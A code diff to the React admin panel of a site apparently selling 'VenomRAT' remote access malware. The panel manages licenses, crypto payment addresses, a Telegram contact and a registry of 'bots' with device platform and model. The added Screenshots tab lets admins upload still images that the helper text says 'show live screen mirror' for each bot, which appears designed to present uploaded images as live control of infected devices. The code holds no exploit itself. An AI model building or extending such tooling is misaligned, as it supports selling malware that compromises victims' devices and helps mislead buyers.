@@ -10,8 +10,9 @@ import { Textarea } from "@/components/ui/textarea";
 import { useToast } from "@/hooks/use-toast";
 import { supabase } from "@/integrations/supabase/client";
 import { useRole } from "@/hooks/useRole";
-import { Shield, Users, Key, Package, Coins, Trash2, Zap, Settings } from "lucide-react";
+import { Shield, Users, Key, Package, Coins, Trash2, Zap, Settings, Smartphone, Upload, Image as ImageIcon } from "lucide-react";
 import { useNavigate } from "react-router-dom";
+import { Badge } from "@/components/ui/badge";
 
 const Admin = () => {
   const { isAdmin, loading: roleLoading } = useRole();
@@ -22,8 +23,11 @@ const Admin = () => {
   const [licenses, setLicenses] = useState<any[]>([]);
   const [cryptoAddresses, setCryptoAddresses] = useState<any[]>([]);
   const [features, setFeatures] = useState<any[]>([]);
+  const [bots, setBots] = useState<any[]>([]);
   const [featuresSectionName, setFeaturesSectionName] = useState("Platform Features");
   const [telegramHandle, setTelegramHandle] = useState("");
+  const [websiteName, setWebsiteName] = useState("VenomRAT");
+  const [selectedBotForScreenshot, setSelectedBotForScreenshot] = useState<string>("");
 
   useEffect(() => {
     if (!roleLoading && !isAdmin) {
@@ -38,25 +42,29 @@ const Admin = () => {
   }, [isAdmin]);
 
   const fetchData = async () => {
-    const [usersData, packagesData, licensesData, cryptoData, featuresData, settingsData] = await Promise.all([
+    const [usersData, packagesData, licensesData, cryptoData, featuresData, botsData, settingsData] = await Promise.all([
       supabase.from("user_roles").select("*"),
       supabase.from("packages").select("*"),
       supabase.from("licenses").select("*"),
       supabase.from("crypto_addresses").select("*"),
       supabase.from("features").select("*").order("display_order"),
-      supabase.from("settings_global").select("*").in("key", ["features_section_name", "telegram_handle"]),
+      supabase.from("bots").select("*").order("created_at", { ascending: false }),
+      supabase.from("settings_global").select("*").in("key", ["features_section_name", "telegram_handle", "website_name"]),
     ]);
     setUsers(usersData.data || []);
     setPackages(packagesData.data || []);
     setLicenses(licensesData.data || []);
     setCryptoAddresses(cryptoData.data || []);
     setFeatures(featuresData.data || []);
+    setBots(botsData.data || []);
     
     if (settingsData.data) {
       const featureName = settingsData.data.find(s => s.key === "features_section_name")?.value;
       const telegram = settingsData.data.find(s => s.key === "telegram_handle")?.value;
+      const website = settingsData.data.find(s => s.key === "website_name")?.value;
       if (featureName) setFeaturesSectionName(featureName);
       if (telegram) setTelegramHandle(telegram);
+      if (website) setWebsiteName(website);
     }
   };
 
@@ -202,6 +210,7 @@ const Admin = () => {
     const updates = [
       { key: "features_section_name", value: formData.get("features_section_name") as string },
       { key: "telegram_handle", value: formData.get("telegram_handle") as string },
+      { key: "website_name", value: formData.get("website_name") as string },
     ];
 
     for (const setting of updates) {
@@ -209,6 +218,20 @@ const Admin = () => {
     }
 
     toast({ title: "Success", description: "Settings updated" });
+    fetchData();
+  };
+
+  const uploadBotScreenshot = async (file: File) => {
+    if (!selectedBotForScreenshot) return;
+    const fileExt = file.name.split('.').pop();
+    const fileName = `${selectedBotForScreenshot}-${Date.now()}.${fileExt}`;
+    const { error: uploadError } = await supabase.storage.from('bot-screenshots').upload(fileName, file, { upsert: true });
+    if (uploadError) throw uploadError;
+    const { data: { publicUrl } } = supabase.storage.from('bot-screenshots').getPublicUrl(fileName);
+    const { error: updateError } = await supabase.from('bots').update({ screenshot_url: publicUrl }).eq('id', selectedBotForScreenshot);
+    if (updateError) throw updateError;
+    toast({ title: "Success", description: "Screenshot uploaded" });
+    setSelectedBotForScreenshot("");
     fetchData();
   };
 
@@ -227,12 +250,13 @@ const Admin = () => {
         </div>
 
         <Tabs defaultValue="users" className="w-full">
-          <TabsList className="grid w-full grid-cols-5 mb-8">
+          <TabsList className="grid w-full grid-cols-6 mb-8">
             <TabsTrigger value="users"><Users className="w-4 h-4 mr-2" />Users</TabsTrigger>
             <TabsTrigger value="licenses"><Key className="w-4 h-4 mr-2" />Licenses</TabsTrigger>
             <TabsTrigger value="packages"><Package className="w-4 h-4 mr-2" />Packages</TabsTrigger>
             <TabsTrigger value="crypto"><Coins className="w-4 h-4 mr-2" />Crypto</TabsTrigger>
             <TabsTrigger value="features"><Zap className="w-4 h-4 mr-2" />Features</TabsTrigger>
+            <TabsTrigger value="screenshots"><Smartphone className="w-4 h-4 mr-2" />Screenshots</TabsTrigger>
           </TabsList>
 
           <TabsContent value="users">
@@ -467,6 +491,16 @@ const Admin = () => {
                       required 
                     />
                   </div>
+                  <div>
+                    <Label htmlFor="website_name">Website Name</Label>
+                    <Input 
+                      id="website_name" 
+                      name="website_name" 
+                      placeholder="VenomRAT"
+                      defaultValue={websiteName}
+                      required 
+                    />
+                  </div>
                   <Button type="submit" className="w-full">Update Settings</Button>
                 </form>
               </Card>
@@ -507,6 +541,95 @@ const Admin = () => {
                         <Trash2 className="w-4 h-4" />
                       </Button>
                     </div>
+                  ))}
+                </div>
+              </Card>
+            </div>
+          </TabsContent>
+
+          <TabsContent value="screenshots">
+            <div className="grid gap-6">
+              <Card className="p-6 bg-card border-border">
+                <h2 className="text-xl font-semibold mb-4 text-foreground flex items-center gap-2">
+                  <ImageIcon className="w-5 h-5 text-primary" />
+                  Upload Bot Screenshots
+                </h2>
+                <div className="space-y-4">
+                  <div>
+                    <Label>Select Bot</Label>
+                    <Select value={selectedBotForScreenshot} onValueChange={setSelectedBotForScreenshot}>
+                      <SelectTrigger>
+                        <SelectValue placeholder="Choose a bot" />
+                      </SelectTrigger>
+                      <SelectContent>
+                        {bots?.map((bot) => (
+                          <SelectItem key={bot.id} value={bot.id}>
+                            {bot.name} - {bot.platform}
+                          </SelectItem>
+                        ))}
+                      </SelectContent>
+                    </Select>
+                  </div>
+
+                  {selectedBotForScreenshot && (
+                    <div>
+                      <Label>Upload Screenshot</Label>
+                      <Input
+                        type="file"
+                        accept="image/*"
+                        onChange={(e) => {
+                          const file = e.target.files?.[0];
+                          if (file) {
+                            uploadBotScreenshot(file);
+                          }
+                        }}
+                      />
+                      <p className="text-xs text-muted-foreground mt-1">
+                        Upload a screenshot to show live screen mirror for this bot
+                      </p>
+                    </div>
+                  )}
+                </div>
+              </Card>
+
+              <Card className="p-6 bg-card border-border">
+                <h2 className="text-xl font-semibold mb-4 text-foreground">Bot Screenshots</h2>
+                <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
+                  {bots?.filter(bot => bot.screenshot_url).map((bot) => (
+                    <Card key={bot.id} className="overflow-hidden">
+                      <div className="aspect-[9/16] relative">
+                        <img 
+                          src={bot.screenshot_url} 
+                          alt={bot.name}
+                          className="w-full h-full object-cover"
+                        />
+                      </div>
+                      <div className="p-4 space-y-2">
+                        <p className="font-semibold">{bot.name}</p>
+                        <div className="flex gap-2">
+                          <Badge variant="outline">{bot.platform}</Badge>
+                          <Badge variant="outline">{bot.model}</Badge>
+                        </div>
+                        <Button
+                          variant="destructive"
+                          size="sm"
+                          className="w-full"
+                          onClick={async () => {
+                            const { error } = await supabase
+                              .from('bots')
+                              .update({ screenshot_url: null })
+                              .eq('id', bot.id);
+                            if (!error) {
+                              toast({ title: "Success", description: "Screenshot removed" });
+                              fetchData();
+                            }
+                          }}
+                        >
+                          <Trash2 className="w-4 h-4 mr-2" />
+                          Remove Screenshot
+                        </Button>
+                      </div>
+                    </Card>
                   ))}
                 </div>
               </Card>
